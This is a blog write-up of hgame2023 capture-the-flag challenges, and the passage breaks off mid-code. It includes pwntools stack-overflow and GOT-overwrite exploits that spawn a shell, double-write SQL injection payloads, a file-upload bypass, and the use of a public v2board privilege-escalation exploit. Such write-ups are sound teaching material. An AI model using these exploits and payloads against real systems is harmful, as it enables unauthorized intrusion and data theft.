@@ -1,0 +1,401 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="aesm1p">
+
+
+
+    <meta name="description" content="相逢意气为君饮">
+
+
+
+<title>hgame2023部分题目 | aesm1p&#39;s blog</title>
+
+
+
+    <link rel="icon" href="/a.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">aesm1p&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">aesm1p&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">hgame2023部分题目</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">aesm1p</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">March 11, 2023&nbsp;&nbsp;17:40:45</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/writeup/">writeup</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h1 id="Week1"><a href="#Week1" class="headerlink" title="Week1"></a>Week1</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="Classic-Childhood-Game"><a href="#Classic-Childhood-Game" class="headerlink" title="Classic Childhood Game"></a>Classic Childhood Game</h3><p>一个纯前端游戏，勇士拯救公主的热血故事，查看源代码找到Events.js文件，可以看到通关后调用了mota函数</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Message</span> = [<span class="string">&quot;[Enemy=52,魔物首领古顿]恩，罪恶权杖的威力果然很大，只有你能掌控它了，哈哈哈&quot;</span>, <span class="string">&quot;[Hero]誓死效忠ZENO大人！&quot;</span>, <span class="string">&quot;[Npc=3,仙子]恭喜你通关了最悲惨结局的纪元魔塔前传&quot;</span>];</span><br><span class="line"><span class="title function_">mota</span>();</span><br></pre></td></tr></table></figure>
+
+<p>mota函数进行了复杂的字符串出来，只需要将mota函数内容复制到浏览器执行一遍即可得到flag<br><img src="https://s2.loli.net/2023/01/06/toHiZPFpMvgKCBS.png" alt="image.png"></p>
+<h3 id="Become-A-Member"><a href="#Become-A-Member" class="headerlink" title="Become A Member"></a>Become A Member</h3><p>个人感觉这个题目有点脑洞题，当时没做出来，主要就是没搞明白<code>身份证明（Cute-Bunny）</code>这个内容的含义是要修改UA头，完全没联想到这里，我想到的是Cookie，还爆破了半天的Bunny Name。后面找出题人聊天，出题人给了提示说是想下请求头的考点，我就想到了请求走私，结果一试还真有，但是这个是意外，支持思路就彻底歪了<br><img src="https://s2.loli.net/2023/01/13/GDgSaCHOsdmP2Vf.png" alt="image.png"></p>
+<p>这题只要能把身份证明联系到UA上，后面就简单了，各个部分都有明确的提示，这里就不细说了<br><img src="https://s2.loli.net/2023/01/13/J9WbfmKcXgHizQp.png" alt="image.png"></p>
+<h3 id="Guess-Who-I-Am"><a href="#Guess-Who-I-Am" class="headerlink" title="Guess Who I Am"></a>Guess Who I Am</h3><p>爬虫题目，查看源代码可以看到成员名单，根据名单中的intro字段得到成员id，</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">arr = [</span><br><span class="line">	&#123;</span><br><span class="line">        <span class="string">&quot;id&quot;</span>: <span class="string">&quot;ba1van4&quot;</span>,</span><br><span class="line">        <span class="string">&quot;intro&quot;</span>: <span class="string">&quot;21级 / 不会Re / 不会美工 / 活在梦里 / 喜欢做不会的事情 / ◼◻粉&quot;</span>,</span><br><span class="line">        <span class="string">&quot;avatar&quot;</span>: <span class="string">&quot;https://thirdqq.qlogo.cn/g?b=sdk&amp;k=kSt5er0OQMXROy28nzTia0A&amp;s=640&quot;</span>,</span><br><span class="line">        <span class="string">&quot;url&quot;</span>: <span class="string">&quot;https://ba1van4.icu&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment"># ...</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">findname</span>(<span class="params">intro</span>):</span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> arr:</span><br><span class="line">        <span class="keyword">if</span> each.get(<span class="string">&quot;intro&quot;</span>) == intro:</span><br><span class="line">            <span class="keyword">return</span> each.get(<span class="string">&quot;id&quot;</span>)</span><br><span class="line"></span><br><span class="line">prefix_url = <span class="string">&#x27;http://week-1.hgame.lwsec.cn:30531/api/&#x27;</span></span><br><span class="line">s = requests.Session()</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    question = s.get(prefix_url + <span class="string">&#x27;getQuestion&#x27;</span>).text</span><br><span class="line">    ans = findname(json.loads(question).get(<span class="string">&#x27;message&#x27;</span>))</span><br><span class="line">    <span class="built_in">print</span>(question)</span><br><span class="line">    payload = &#123;<span class="string">&#x27;id&#x27;</span>: ans&#125;</span><br><span class="line">    res = s.post(prefix_url + <span class="string">&#x27;verifyAnswer&#x27;</span>, data=payload).text</span><br><span class="line">    <span class="built_in">print</span>(res)</span><br><span class="line">    score = s.get(prefix_url + <span class="string">&#x27;getScore&#x27;</span>).text</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;hgame&#x27;</span> <span class="keyword">in</span> score:</span><br><span class="line">        <span class="built_in">print</span>(score)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<p>运行脚本即可拿到flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;message&quot;:&quot;hgame&#123;Guess_who_i_am^Happy_Crawler&#125;&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Show-Me-Your-Beauty"><a href="#Show-Me-Your-Beauty" class="headerlink" title="Show Me Your Beauty"></a>Show Me Your Beauty</h3><p>文件上传，只验证了后缀，用大小写即可绕过<br><img src="https://s2.loli.net/2023/01/14/wDYAVNcfS4jhs3g.png" alt="image.png"></p>
+<p>getflag<br><img src="https://s2.loli.net/2023/01/14/7fHsgZL2EV1Bc5P.png" alt="image.png"></p>
+<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="test-nc"><a href="#test-nc" class="headerlink" title="test_nc"></a>test_nc</h3><p>测试题目，直接连接即可<br><img src="https://s2.loli.net/2023/01/07/je921EbmofIOwtc.png" alt="image.png"></p>
+<h3 id="easy-overflow"><a href="#easy-overflow" class="headerlink" title="easy_overflow"></a>easy_overflow</h3><p>和攻防世界的level0一样，就是简单的栈溢出，然后文件还有个backdoor函数调用了sh命令，所以只要返回这个函数的地址就行了，伪代码如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">16</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  close(<span class="number">1</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>唯一的坑是通过close函数关闭标准输出，所以需要重定向一下，可以通过<code>exec 1&gt;&amp;2</code>或者<code>exec 1&gt;&amp;0</code>来拿到回显<br>代码如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;week-1.hgame.lwsec.cn&#x27;</span>, <span class="number">31626</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./vuln&quot;)</span></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span> * <span class="number">0x18</span> + p64(<span class="number">0x00401176</span>).decode()</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>重定向<br><img src="https://s2.loli.net/2023/01/07/SjQGDt3efk4y7gO.png" alt="image.png"></p>
+<hr>
+<p>PWN研究的不多，接下来的就是主要对着writeup学习了</p>
+<h3 id="choose-the-seat"><a href="#choose-the-seat" class="headerlink" title="choose_the_seat"></a>choose_the_seat</h3><p>这个题目很可惜，当时其实已经做的差不多了，就是libc地址泄露失败了，想要将put函数劫持为printf函数泄露地址但是没有成功，只是卡在这一步，其他都没问题了，很可惜。<br>反汇编可以看到存在read函数，可以输入一个bss段的变量，可以输入负数，这样就可以覆盖GOT表，一次可以写入16个字节，所以我们可以通过vuln函数覆盖got中的exit函数实现循环执行，然后第二轮通过puts函数泄露libc函数从而获取lib基址，由于puts函数输出会截断，假设输出setbuf的地址，这里我们输入一位a，那么会覆盖setbuf的地址最低1位被覆盖为a，但是由于libc的最后三位是固定的，所以这里我们其实即使最后一位被覆盖也是可以知道全部地址的，这里获取libc地址之后将puts函数覆盖为system函数即可，然后再输入<code>/bin/sh</code>作为参数即可</p>
+<p>exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">main = elf.sym[<span class="string">&#x27;vuln&#x27;</span>]</span><br><span class="line">exit_got = elf.got[<span class="string">&#x27;exit&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;week-1.hgame.lwsec.cn&#x27;</span>, <span class="number">31137</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./vuln&#x27;)</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;one.\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;-6&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;name\n&#x27;</span>)</span><br><span class="line">p.send(p64(main)+p64(main))</span><br><span class="line"></span><br><span class="line"><span class="comment">### round2 leak libc base</span></span><br><span class="line">setbuf = libc.sym[<span class="string">&#x27;setbuf&#x27;</span>]</span><br><span class="line">system = libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_setbuf&#x27;</span>, <span class="built_in">hex</span>(setbuf))</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;one.\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;-8&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;name\n&#x27;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;name is &#x27;</span>)</span><br><span class="line">a = p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_base = u64(a) - <span class="number">0x8ba61</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_base: &#x27;</span>, <span class="built_in">hex</span>(libc_base))</span><br><span class="line">real_system = libc_base + system</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;real_system&#x27;</span>, <span class="built_in">hex</span>(real_system))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">### round3 hijack puts with system</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;one.\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;-9&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;name\n&#x27;</span>)</span><br><span class="line">p.send(p64(real_system)+p64(real_system))</span><br><span class="line"></span><br><span class="line"><span class="comment">### round4</span></span><br><span class="line">p.recvline()</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">p.send(<span class="string">b&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>漏洞利用<br><img src="https://s2.loli.net/2023/01/18/HTYigVje3RmUZvM.png" alt="image.png"></p>
+<h1 id="Week2"><a href="#Week2" class="headerlink" title="Week2"></a>Week2</h1><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="Git-Leakage"><a href="#Git-Leakage" class="headerlink" title="Git Leakage"></a>Git Leakage</h3><p>直接githack一把梭就拿到了flag，这是出了个寂寞吗</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python GitHack.py http://week-2.hgame.lwsec.cn:31681/</span><br></pre></td></tr></table></figure>
+
+<p>得到flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;Don&#x27;t^put*Git-in_web_directory&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="v2board"><a href="#v2board" class="headerlink" title="v2board"></a>v2board</h3><p>v2board的是一个机场，在1.6.1存在漏洞，存在越权漏洞，是由于redis缓存问题导致的。代码判断仅仅判断redis中是否有authorization，如果有就默认可以访问admin，但是普通用户也可以添加authorization缓存，所以就会导致普通用户越权成为admin。<br>github存在一个<a target="_blank" rel="noopener" href="https://github.com/zgao264/v2board-exp">exp</a></p>
+<p>直接拿来打，但是在windows下执行会报错</p>
+<blockquote>
+<p>NotADirectoryError: [WinError 267] 目录名称无效。: ‘week-2.hgame.lwsec.cn:30282’</p>
+</blockquote>
+<p>这是由于目录文件导致，修改代码116行的目录名为一个合法目录即可</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># create_dir(domian)</span></span><br><span class="line">create_dir(<span class="string">&#x27;dumpinfo&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p>然后运行</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python v2board<span class="literal">-exp</span>.py http://week<span class="literal">-2</span>.hgame.lwsec.cn:<span class="number">30282</span></span><br></pre></td></tr></table></figure>
+
+<p>在user_fetch.json文件中即可找到admin的订阅链接</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;39d580e71705f6abac9a414def74c466&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个题也可以手动做，逻辑很简单</p>
+<h3 id="Search-Commodity"><a href="#Search-Commodity" class="headerlink" title="Search Commodity"></a>Search Commodity</h3><p>数字型sql注入，过滤了部分字符，可以通过双写绕过，可以通过如下payload来检测绕过的字符</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search_id=1-length(&#x27;select&#x27;)#</span><br></pre></td></tr></table></figure>
+
+<p>可以发现过滤了<code>from,union,where,or,/**/</code>等特殊字符，双写绕过即可</p>
+<p>爆表名</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search_id<span class="operator">=</span><span class="number">-15</span><span class="comment">/*/**/</span><span class="operator">*</span><span class="operator">/</span>uniounionn<span class="comment">/*/**/</span><span class="operator">*</span><span class="operator">/</span>selselectect<span class="comment">/*/**/</span><span class="operator">*</span><span class="operator">/</span><span class="number">1</span>,group_concat(table_name),<span class="number">3</span><span class="comment">/*/**/</span><span class="operator">*</span><span class="operator">/</span>frfromom<span class="comment">/*/**/</span><span class="operator">*</span><span class="operator">/</span>infoorrmation_schema.tables<span class="comment">/*/**/</span><span class="operator">*</span><span class="operator">/</span>whewherere<span class="comment">/*/**/</span><span class="operator">*</span><span class="operator">/</span>table_schema<span class="comment">/*/**/</span><span class="operator">*</span><span class="operator">/</span><span class="keyword">like</span><span class="comment">/*/**/</span><span class="operator">*</span><span class="operator">/</span><span class="string">&#x27;se4rch&#x27;</span>#</span><br></pre></td></tr></table></figure>
+
+<p>5ecret15here,L1st,user1nf0</p>
+<p>爆列名</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search_id<span class="operator">=</span><span class="number">-15</span><span class="comment">/*/**/</span><span class="operator">*</span><span class="operator">/</span>uniounionn<span class="comment">/*/**/</span><span class="operator">*</span><span class="operator">/</span>selselectect<span class="comment">/*/**/</span><span class="operator">*</span><span class="operator">/</span><span class="number">1</span>,group_concat(column_name),<span class="number">3</span><span class="comment">/*/**/</span><span class="operator">*</span><span class="operator">/</span>frfromom<span class="comment">/*/**/</span><span class="operator">*</span><span class="operator">/</span>infoorrmation_schema.columns<span class="comment">/*/**/</span><span class="operator">*</span><span class="operator">/</span>whewherere<span class="comment">/*/**/</span><span class="operator">*</span><span class="operator">/</span>table_name<span class="comment">/*/**/</span><span class="operator">*</span><span class="operator">/</span><span class="keyword">like</span><span class="comment">/*/**/</span><span class="operator">*</span><span class="operator">/</span><span class="string">&#x27;5ecret15here&#x27;</span>#</span><br></pre></td></tr></table></figure>
+
+<p>f14gggg1shere</p>
+<p>获取flag</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search_id<span class="operator">=</span><span class="number">-15</span><span class="comment">/*/**/</span><span class="operator">*</span><span class="operator">/</span>uniounionn<span class="comment">/*/**/</span><span class="operator">*</span><span class="operator">/</span>selselectect<span class="comment">/*/**/</span><span class="operator">*</span><span class="operator">/</span><span class="number">1</span>,f14gggg1shere,<span class="number">3</span><span class="comment">/*/**/</span><span class="operator">*</span><span class="operator">/</span>frfromom<span class="comment">/*/**/</span><span class="operator">*</span><span class="operator">/</span><span class="number">5</span>ecret15here#</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2023/01/30/rMKuAg96kWjaw57.png" alt="image.png"></p>
+<h3 id="Designer"><a href="#Designer" class="headerlink" title="Designer"></a>Designer</h3><p>ExpressJS代码审计<br>基本功能就是调整按钮的样式，最终生成一个按钮。<br>代码中给出了flag的获取逻辑</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/user/register&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> username = req.<span class="property">body</span>.<span class="property">username</span></span><br><span class="line">  <span class="keyword">let</span> flag = <span class="string">&quot;hgame&#123;fake_flag_here&#125;&quot;</span></span><br><span class="line">  <span class="keyword">if</span> (username == <span class="string">&quot;admin&quot;</span> &amp;&amp; req.<span class="property">ip</span> == <span class="string">&quot;127.0.0.1&quot;</span> || req.<span class="property">ip</span> == <span class="string">&quot;::ffff:127.0.0.1&quot;</span>) &#123;</span><br><span class="line">    flag = <span class="string">&quot;hgame&#123;true_flag_here&#125;&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">const</span> token = jwt.<span class="title function_">sign</span>(&#123; username, flag &#125;, secret)</span><br><span class="line">  res.<span class="title function_">json</span>(&#123; token &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>flag存储在服务端admin用户的token变量中，网站还存在share功能</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/button/share&quot;</span>, auth, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> browser = <span class="keyword">await</span> puppeteer.<span class="title function_">launch</span>(&#123;</span><br><span class="line">    <span class="attr">headless</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">executablePath</span>: <span class="string">&quot;/usr/bin/chromium&quot;</span>,</span><br><span class="line">    <span class="attr">args</span>: [<span class="string">&#x27;--no-sandbox&#x27;</span>]</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">const</span> page = <span class="keyword">await</span> browser.<span class="title function_">newPage</span>()</span><br><span class="line">  <span class="keyword">const</span> query = querystring.<span class="title function_">encode</span>(req.<span class="property">body</span>)</span><br><span class="line">  <span class="keyword">await</span> page.<span class="title function_">goto</span>(<span class="string">&#x27;http://127.0.0.1:9090/button/preview?&#x27;</span> + query)</span><br><span class="line">  <span class="keyword">await</span> page.evaluate(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">localStorage</span>.<span class="title function_">setItem</span>(<span class="string">&quot;token&quot;</span>, <span class="string">&quot;jwt_token_here&quot;</span>)</span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="keyword">await</span> page.<span class="title function_">click</span>(<span class="string">&quot;#button&quot;</span>)</span><br><span class="line"></span><br><span class="line">  res.<span class="title function_">json</span>(&#123; <span class="attr">msg</span>: <span class="string">&quot;admin will see it later&quot;</span> &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>可以看到share功能就是模拟服务端管理员本地点击我们提交的按钮，所以攻击思路就是通过构造存储型XSS来带出token</p>
+<p>题目对XSS做了一定的防护</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/button/preview&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> blacklist = [</span><br><span class="line">    <span class="regexp">/on/i</span>, <span class="regexp">/localStorage/i</span>, <span class="regexp">/alert/</span>, <span class="regexp">/fetch/</span>, <span class="regexp">/XMLHttpRequest/</span>, <span class="regexp">/window/</span>, <span class="regexp">/location/</span>, <span class="regexp">/document/</span></span><br><span class="line">  ]</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> key <span class="keyword">in</span> req.<span class="property">query</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> item <span class="keyword">of</span> blacklist) &#123;</span><br><span class="line">      <span class="keyword">if</span> (item.<span class="title function_">test</span>(key.<span class="title function_">trim</span>()) || 